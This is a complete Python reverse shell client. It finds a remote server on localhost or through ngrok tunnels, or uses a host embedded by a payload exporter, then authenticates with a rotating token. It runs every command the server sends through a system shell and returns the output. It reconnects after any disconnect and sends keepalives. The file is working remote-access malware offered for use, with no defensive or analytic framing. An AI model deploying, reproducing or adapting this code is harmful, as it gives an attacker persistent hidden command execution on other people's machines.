#!/usr/bin/env python3
"""
Reverse Shell Client
- Auto-discovers server (localhost first, then ngrok scan)
- Auto-reconnects on disconnect
- Executes commands and returns output
- Sends keepalives
"""
import os
import sys
import socket
import subprocess
import time
import argparse
import platform

# Add parent dir to path so we can import core
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.discovery import Discovery


class Client:
    """Reverse shell client"""
    
    DEFAULT_PORT = 4444
    DEFAULT_DOMAIN_PREFIX = "tcp.eu.ngrok.io"
    RECONNECT_DELAY = 30
    KEEPALIVE_INTERVAL = 20
    RECV_TIMEOUT = 2.0
    COMMAND_TIMEOUT = 60
    
    def __init__(
        self,
        auth_token,
        host=None,
        port=None,
        auto_discover=True,
        verbose=False,
    ):
        self.auth_token = auth_token
        self.host = host
        self.port = port or self.DEFAULT_PORT
        self.auto_discover = auto_discover
        self.verbose = verbose
        
        self.socket = None
        self.running = False
        self._reconnect_count = 0
        self._last_keepalive = 0
        self._in_command = False
    
    # ============================================
    # Logging
    # ============================================
    def log(self, msg, force=False):
        if self.verbose or force:
            print(f"[client] {msg}", flush=True)
    
    # ============================================
    # Discovery
    # ============================================
    def discover(self):
        """Auto-discover server"""
        if not self.auto_discover:
            return (self.host, self.port)
        
        self.log("Discovering server...", force=True)
        
        discovery = Discovery(
            auth_token=self.auth_token,
            port=self.port,
        )
        
        def callback(domain, status, result):
            if self.verbose:
                icon = {'checking': '🔍', 'found': '✅', 'failed': '❌'}[status]
                print(f"  {icon} {domain}", flush=True)
        
        result = discovery.find(callback, verbose=self.verbose)
        
        if result:
            self.host, self.port = result
            self.log(f"Found server at {self.host}:{self.port}", force=True)
            return result
        
        return None
    
    # ============================================
    # Connection
    # ============================================
    def connect(self):
        """Connect to server and authenticate"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(10.0)
            self.socket.connect((self.host, self.port))
            
            # Authenticate
            _srv = globals().get("_RSC_SERVER_UUID")
            _pay = globals().get("_RSC_PAYLOAD_UUID")
            if _srv and _pay:
                _auth_msg = f"AUTH:{_srv}:{_pay}:{self.auth_token}\n"
            else:
                _auth_msg = f"AUTH:{self.auth_token}\n"
            self.socket.send(_auth_msg.encode())
            response = self.socket.recv(1024).decode().strip()
            
            if response != "AUTH_SUCCESS":
                self.log(f"Auth failed: {response}", force=True)
                self.socket.close()
                self.socket = None
                return False
            
            self.log("Authenticated", force=True)
            self.socket.settimeout(None)
            return True
            
        except Exception as e:
            self.log(f"Connect error: {e}", force=True)
            if self.socket:
                try:
                    self.socket.close()
                except:
                    pass
                self.socket = None
            return False
    
    def send_location(self):
        """Send client's script location"""
        try:
            location = os.path.abspath(__file__)
            self.socket.send(f"[+] Client location: {location}\n".encode())
        except:
            pass
    
    # ============================================
    # Command execution
    # ============================================
    def execute(self, command):
        """Execute a command locally, return output"""
        if not command.strip():
            return ""
        
        try:
            if platform.system() == 'Windows':
                # Windows shell
                proc = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                )
            else:
                # Linux/Mac shell
                proc = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                )
            
            try:
                stdout, stderr = proc.communicate(timeout=self.COMMAND_TIMEOUT)
            except subprocess.TimeoutExpired:
                proc.kill()
                stdout, stderr = proc.communicate()
                return "[!] Command timed out"
            
            # Combine output
            output = stdout + stderr
            if not output:
                return "(no output)"
            
            # Decode safely
            try:
                return output.decode('utf-8', errors='replace')
            except:
                return str(output)
                
        except Exception as e:
            return f"[!] Execution error: {e}"
    
    # ============================================
    # Main loop
    # ============================================
    def run(self):
        """Main client loop with hibernation on disconnect."""
        self.running = True
        self._reconnect_count = 0

        self.log("Client starting...", force=True)

        while self.running:
            # Discover server if not set
            if not self.host or not self.auto_discover:
                if not self.discover():
                    self._hibernate("server not found")
                    continue

            # Connect
            if not self.connect():
                self._hibernate("connection failed")
                continue

            # Successful connection — reset hibernate counter
            if self._reconnect_count > 0:
                self.log(f"[+] Reconnected after {self._reconnect_count} attempt(s)", force=True)
            self._reconnect_count = 0

            # Send location
            self.send_location()

            # Command loop
            self._command_loop()

            # Cleanup
            if self.socket:
                try:
                    self.socket.close()
                except:
                    pass
                self.socket = None

            if self.running:
                self._hibernate("disconnected")

        self.log("Client stopped", force=True)

    def _hibernate(self, reason):
        """Enter hibernation: sleep + retry counter for the next attempt."""
        self._reconnect_count += 1
        delay = self.RECONNECT_DELAY
        self.log(
            f"[hibernate] {reason} — retry #{self._reconnect_count} in {delay}s",
            force=True,
        )
        time.sleep(delay)

    def _command_loop(self):
        """Handle incoming commands"""
        buffer = b""
        
        while self.running and self.socket:
            try:
                # Check keepalive
                self._maybe_send_keepalive()
                
                # Receive data
                self.socket.settimeout(self.RECV_TIMEOUT)
                try:
                    chunk = self.socket.recv(4096)
                except socket.timeout:
                    continue
                
                if not chunk:
                    self.log("Server closed connection", force=True)
                    break
                
                buffer += chunk
                
                # Process commands (line-by-line)
                while b"\n" in buffer:
                    line, buffer = buffer.split(b"\n", 1)
                    command = line.decode(errors='ignore').strip()
                    
                    if not command:
                        continue
                    
                    self.log(f"Command: {command}", force=True)
                    
                    # Graceful shutdown: 'exit' / 'quit' / 'bye' terminates
                    # the client instead of being passed to a subshell.
                    if command.strip().lower() in ("exit", "quit", "bye"):
                        self.log("Exit command received", force=True)
                        try:
                            self.socket.send(
                                b"<<<RSC_BEGIN>>>\nBye.\n<<<RSC_END>>>\n"
                            )
                        except Exception:
                            pass
                        self.running = False
                        return
                    
                    # Execute
                    self._in_command = True
                    try:
                        output = self.execute(command)
                    finally:
                        self._in_command = False
                    
                    # Send back with sentinels so the server can frame it.
                    payload = (
                        "<<<RSC_BEGIN>>>\n"
                        + output
                        + ("" if output.endswith("\n") else "\n")
                        + "<<<RSC_END>>>\n"
                    )
                    try:
                        self.socket.send(payload.encode())
                    except Exception as e:
                        self.log(f"Send error: {e}", force=True)
                        return
                        
            except (ConnectionResetError, BrokenPipeError):
                self.log("Connection lost", force=True)
                break
            except Exception as e:
                self.log(f"Loop error: {e}", force=True)
                break
    
    def _maybe_send_keepalive(self):
        """Send keepalive every KEEPALIVE_INTERVAL seconds.

        Skipped while a command is executing — otherwise the keepalive
        can race ahead of the command response and confuse the server's
        framing logic.
        """
        if self._in_command:
            return
        now = time.time()
        if now - self._last_keepalive >= self.KEEPALIVE_INTERVAL:
            try:
                self.socket.send(b"\n")
                self._last_keepalive = now
            except:
                pass
    
    def stop(self):
        """Stop the client"""
        self.running = False
        if self.socket:
            try:
                self.socket.close()
            except:
                pass


# ============================================
# CLI
# ============================================
def main():
    parser = argparse.ArgumentParser(
        description="Reverse Shell Client",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python client.py                          # Auto-discover server
  python client.py --host 192.168.1.21      # Direct connect
  python client.py --host 1.2.3.4 --port 4444
  python client.py --token ABC123           # Custom auth token
  python client.py -v                       # Verbose
        """,
    )
    parser.add_argument('--host', help='Server host (skips discovery)')
    parser.add_argument('--port', type=int, default=4444, help='Server port')
    parser.add_argument('--token', default=None,
                        help='Direct rotating token (overrides --secret)')
    parser.add_argument('--secret', default=None,
                        help='Master secret (computes the current rotating token)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    args = parser.parse_args()

    # Resolve auth token:
    #   1. --secret  -> compute current rotating token from master secret
    #   2. --token   -> use directly
    #   3. embedded  -> exporter-injected _RSC_MASTER_SECRET global
    #   4. else      -> error
    auth_token = None
    if args.secret:
        from core.auth import Auth
        auth_token = Auth(master_secret=args.secret).token
        if args.verbose:
            print(f"[*] Computed token from --secret: {auth_token[:8]}...")
    elif args.token:
        auth_token = args.token
    else:
        embedded = globals().get('_RSC_MASTER_SECRET')
        if embedded:
            from core.auth import Auth
            rotation = globals().get('_RSC_ROTATION_SECONDS', 3600)
            auth_token = Auth(
                master_secret=embedded, rotation_seconds=rotation,
            ).token
            if args.verbose:
                print(f"[*] Computed token from embedded secret: {auth_token[:8]}...")

    if not auth_token:
        import sys as _sys
        print(
            '[!] No auth: pass --secret, --token, or use an exporter-generated '
            'payload (which embeds the master secret).',
            file=_sys.stderr,
        )
        _sys.exit(1)

    # Prefer embedded ngrok target over discovery when no --host given
    if not args.host:
        _ng_host = globals().get("_RSC_NGROK_HOST")
        _ng_port = globals().get("_RSC_NGROK_PORT")
        if _ng_host and _ng_port:
            args.host = _ng_host
            args.port = int(_ng_port)
            if args.verbose:
                print(f"[*] Using embedded ngrok target: {args.host}:{args.port}")

    client = Client(
        auth_token=auth_token,
        host=args.host,
        port=args.port,
        auto_discover=not args.host,
        verbose=args.verbose,
    )
    
    try:
        client.run()
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        client.stop()


if __name__ == "__main__":
    main()
